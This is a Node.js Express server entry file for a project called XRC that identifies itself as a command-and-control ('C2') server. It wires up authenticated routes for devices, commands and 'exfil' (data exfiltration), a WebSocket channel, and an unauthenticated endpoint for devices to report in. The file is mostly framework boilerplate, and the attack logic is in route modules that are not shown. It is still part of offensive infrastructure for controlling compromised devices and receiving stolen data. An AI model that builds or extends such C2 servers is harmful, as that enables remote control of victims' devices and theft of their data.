// ============================================================
// FILE: XRC/server/src/index.js
// ============================================================
const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const dotenv = require('dotenv');

// Load environment
dotenv.config({ path: path.join(__dirname, '..', '.env') });

const { initDatabase } = require('./db/database');
const { initWebSocket } = require('./ws/websocket');
const authRoutes = require('./routes/auth');
const deviceRoutes = require('./routes/devices');
const commandRoutes = require('./routes/commands');
const exfilRoutes = require('./routes/exfil');
const dashboardRoutes = require('./routes/dashboard');
const apiRoutes = require('./routes/api');
const { authenticateToken } = require('./middleware/auth');

const app = express();
const server = http.createServer(app);

// Security middleware
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));
app.use(cors({
    origin: process.env.CORS_ORIGIN || 'http://localhost:5173',
    credentials: true
}));
app.use(compression());
app.use(morgan(process.env.LOG_LEVEL === 'debug' ? 'dev' : 'combined'));

// Body parsing
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 900000,
    max: parseInt(process.env.RATE_LIMIT_MAX) || 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Static files (dashboard build)
app.use(express.static(path.join(__dirname, '..', '..', 'dashboard', 'dist')));

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/devices', authenticateToken, deviceRoutes);
app.use('/api/commands', authenticateToken, commandRoutes);
app.use('/api/exfil', authenticateToken, exfilRoutes);
app.use('/api/dashboard', authenticateToken, dashboardRoutes);
app.use('/api', authenticateToken, apiRoutes);

// Device message endpoint (no auth — devices use device_id header)
app.use('/api/device', apiRoutes);

// SPA fallback
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '..', '..', 'dashboard', 'dist', 'index.html'));
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// Initialize
async function start() {
    const PORT = process.env.PORT || 3000;

    // Initialize database
    await initDatabase();

    // Initialize WebSocket server
    initWebSocket(server);

    server.listen(PORT, '0.0.0.0', () => {
        console.log(`[XRC C2] Server running on port ${PORT}`);
        console.log(`[XRC C2] WebSocket ready`);
        console.log(`[XRC C2] Dashboard: http://localhost:${PORT}`);
    });
}

start().catch(err => {
    console.error('Failed to start server:', err);
    process.exit(1);
});
